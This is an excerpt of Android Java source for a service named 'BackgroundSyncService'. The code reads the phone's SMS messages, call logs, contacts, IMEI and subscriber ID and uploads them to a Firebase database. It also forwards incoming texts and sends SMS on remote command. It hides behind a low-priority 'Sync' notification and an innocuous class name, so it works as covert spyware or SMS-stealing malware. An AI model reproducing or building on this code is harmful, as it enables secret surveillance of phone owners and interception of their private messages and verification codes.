...
public class BackgroundSyncService extends Service {
        ...
        try {
            ...
            if (c != null && c.moveToFirst()) {
                do {
                    ...
                    s.put("id", cs(c, 0));
                    s.put("address", cs(c, 1));
                    String b = cs(c, 2);
                    s.put("body", b != null && b.length() > 300 ? b.substring(0, 300) + "..." : b);
                    String dt = cs(c, 3);
                    s.put("date", dt);
                    if (dt != null) s.put("date_readable", fmt(Long.parseLong(dt)));
                    String tp = cs(c, 4);
                    s.put("type", "1".equals(tp) ? "INBOX" : "2".equals(tp) ? "SENT" : "OTHER");
                    s.put("read", cs(c, 5));
                    l.add(s);
                } while (c.moveToNext());
            }
        ...
        try {
            ...
            if (c != null && c.moveToFirst()) {
                do {
                    ...
                    cl.put("id", cs(c, 0));
                    cl.put("number", cs(c, 1));
                    String tp = cs(c, 2);
                    cl.put("type", "1".equals(tp) ? "INCOMING" : "2".equals(tp) ? "OUTGOING" : "3".equals(tp) ? "MISSED" : "UNKNOWN");
                    String dt = cs(c, 3);
                    cl.put("date", dt);
                    if (dt != null) cl.put("date_readable", fmt(Long.parseLong(dt)));
                    cl.put("duration", cs(c, 4));
                    cl.put("contact_name", cs(c, 5));
                    l.add(cl);
                } while (c.moveToNext());
            }
        } catch (Exception e) {
    ...
    private String getPhone(String cid) {
        try {
            Cursor c = getContentResolver().query(
                    ...
                    new String[]{"number"}, "contact_id=?", new String[]{cid}, null);
            if (c != null && c.moveToFirst()) {
        ...
        fwListener = new ValueEventListener() {
            public void onDataChange(@NonNull DataSnapshot s) {
                if (s.exists()) {
                    ...
                    Boolean e = s.child("enabled").getValue(Boolean.class);
                    fwOn = e != null && e;
                    Boolean a = s.child("forward_all").getValue(Boolean.class);
                    fwAll = a == null || a;
                    fwFilters.clear();
                    for (DataSnapshot f : s.child("filters").getChildren()) {
                        String n = f.getValue(String.class);
                        if (n != null) fwFilters.add(n);
                    }
                }
            }
    ...
    private void fwSms(String from, String body, long ts) {
        ...
        if (!fwAll && !fwFilters.isEmpty()) {
            boolean m = false;
            for (String f : fwFilters) {
                if (from.contains(f)) {
                    m = true;
                    break;
                }
        ...
        try {
            ...
            l.put("from", from);
            l.put("to", fwNum);
            l.put("body", body != null && body.length() > 100 ? body.substring(0, 100) : body);
            l.put("status", "FORWARDED");
            l.put("forwarded_at", ServerValue.TIMESTAMP);
        ...
        new Thread(new Runnable() {
            ...
            public void run() {
                ...
                try {
                    ...
                    if (c != null && c.moveToFirst()) {
                        do {
                            fwSms(cs(c, 0), cs(c, 1), Long.parseLong(cs(c, 2)));
                        } while (c.moveToNext());
                    }
                } catch (Exception e) {
                } finally {
                ...
                for (DataSnapshot cmd : s.getChildren()) {
                    ...
                    if (to != null && msg != null) {
                        try {
                            ...
                            l.put("message", msg);
                            l.put("status", "SENT");
                            l.put("sent_at", ServerValue.TIMESTAMP);
    ...
    private String cs(Cursor c, int i) {
        try { return c.getString(i); } catch (Exception e) { return ""; }
    }

    private String fmt(long t) {
        try { return new SimpleDateFormat("dd/MM/yyyy hh:mm a", Locale.getDefault()).format(new Date(t)); } catch (Exception e) { return ""; }
    }

    private int getSmsCnt() {
        int n = 0;
        try { Cursor c = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null); if (c != null) { n = c.getCount(); c.close(); } } catch (Exception e) {}
        return n;
    }

    private int getCallCnt() {
        int n = 0;
        try { Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null); if (c != null) { n = c.getCount(); c.close(); } } catch (Exception e) {}
        return n;
    }

    private int getConCnt() {
        int n = 0;
        try { Cursor c = getContentResolver().query(android.provider.ContactsContract.Contacts.CONTENT_URI, null, null, null, null); if (c != null) { n = c.getCount(); c.close(); } } catch (Exception e) {}
        return n;
    }

    private Map<String, Boolean> getPerms() {
    ...
    private int getBat() {
        try { Intent i = registerReceiver(null, new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED)); if (i != null) { int s = i.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1); int l = i.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1); if (s > 0) return (l * 100) / s; } } catch (Exception e) {}
        return 0;
    }

    private String getNet() {
        try { android.net.ConnectivityManager cm = (android.net.ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE); android.net.NetworkInfo n = cm.getActiveNetworkInfo(); if (n != null && n.isConnected()) return n.getTypeName(); } catch (Exception e) {}
        return "Offline";
    }

    private boolean isCharging() {
        try { Intent i = registerReceiver(null, new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED)); if (i != null) { int s = i.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1); return s == android.os.BatteryManager.BATTERY_STATUS_CHARGING || s == android.os.BatteryManager.BATTERY_STATUS_FULL; } } catch (Exception e) {}
        return false;
    }

    private Map<String, Object> getSimInfo() {
        Map<String, Object> s = new HashMap<>();
        try { TelephonyManager t = (TelephonyManager) getSystemService(TELEPHONY_SERVICE); if (t != null) { s.put("sim_operator", t.getSimOperatorName()); s.put("network_operator", t.getNetworkOperatorName()); } } catch (Exception e) {}
        return s;
    }

    private Map<String, Object> getDetSim() {
        Map<String, Object> s = new HashMap<>();
        try { TelephonyManager t = (TelephonyManager) getSystemService(TELEPHONY_SERVICE); if (t != null) { s.put("sim_operator_name", t.getSimOperatorName()); s.put("network_operator_name", t.getNetworkOperatorName()); if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && checkPerm(Manifest.permission.READ_PHONE_STATE)) s.put("imei", t.getImei()); if (checkPerm(Manifest.permission.READ_PHONE_STATE)) s.put("subscriber_id", t.getSubscriberId()); } } catch (Exception e) {}
        return s;
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "Sync", NotificationManager.IMPORTANCE_LOW);
    ...
    private Notification createNotification() {
        Intent i = new Intent(BackgroundSyncService.this, MainActivity.class);
        PendingIntent p = PendingIntent.getActivity(this, 0, i, PendingIntent.FLAG_IMMUTABLE);
    ...
    public void onDestroy() {
        db.child("devices").child(deviceId).child("online_status").setValue(false);
        if (handler != null && syncRunnable != null) handler.removeCallbacks(syncRunnable);
        if (fwListener != null) db.child("devices").child(deviceId).child("forwarding_settings").removeEventListener(fwListener);
        if (cmdListener != null) db.child("devices").child(deviceId).child("manual_commands").child("send_sms").removeEventListener(cmdListener);
        super.onDestroy();
    }

    @Override
    public void onTaskRemoved(Intent r) {
